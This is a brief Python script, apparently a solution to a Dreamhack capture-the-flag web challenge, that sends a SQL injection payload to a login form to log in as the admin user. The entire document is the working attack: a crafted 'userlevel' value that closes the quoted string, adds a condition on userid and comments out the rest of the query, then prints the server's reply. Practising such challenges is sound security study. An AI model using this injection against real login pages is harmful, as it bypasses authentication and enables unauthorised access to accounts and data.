import requests

port = 16546
url_index = f"http://host3.dreamhack.games:{port}/"
url_login = url_index + "login"

param = {"userlevel": "0' and userid='admin' --"}

r = requests.post(url_login, data=param)
print(r.text)
